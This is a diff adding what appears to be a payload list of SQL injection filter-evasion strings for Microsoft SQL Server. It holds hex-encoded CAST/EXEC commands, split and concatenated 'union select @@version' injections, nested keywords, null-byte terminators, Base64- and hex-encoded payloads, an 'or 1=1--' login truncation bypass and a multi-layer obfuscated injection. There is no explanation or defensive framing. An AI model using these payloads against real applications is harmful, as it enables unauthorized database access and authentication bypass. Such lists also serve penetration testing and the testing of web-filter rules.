@@ -1,0 +1,37 @@
+# CAST / CONVERT Encoding
+CAST('CAST and CONVERT' AS CHAR(4))
+CONVERT(VARCHAR, 'CAST', 1)
+CAST(0x53454C45435420404076657273696F6E00 AS VARCHAR(34))
+SET @sqlcommand = CAST('SELECT @@VERSION' AS VARCHAR(16))
+EXEC(@sqlcommand)
+
+# Dynamic String Concatenation
+' uni'+'on se'+'lect @@version'--
+' uni'+'on%20se'+'lect%20@@version'%20--
+
+# Nesting Forbidden Keywords
+SELSELECTECT
+SELESELECTCT
+SELECSELECTT
+
+# Bypass using Null Byte
+' union select @@version --%00
+
+# Base64-Encoded Payload
+JyB1bmknKydvbiUyMChzZScrJ2xlY3QlMjBAQHZlcicrJ3Npb24pJTIwLS0=
+
+# ASCII Hex-Encoded Payload
+2720756e69272b276f6e253230287365272b276c6563742532304040766572272b2773696f6e292532302d2d
+
+# Nested CAST for Obfuscation
+CAST(CAST(0x2720756e69 AS VARCHAR(32)) AS VARCHAR(64))
+SET @sqlcommand = CAST(0x2720756e69... AS VARCHAR(64))
+EXEC(@sqlcommand)
+
+# Truncation Bypass
+username: aaaaaaaaaaaaaaa'
+password: or 1=1--
+password: or uid=0--
+
+# Multi-Layer Obfuscation Example
+' uni'+'on%20(se'+'lect%20@@ver'+'sion)%20--%00
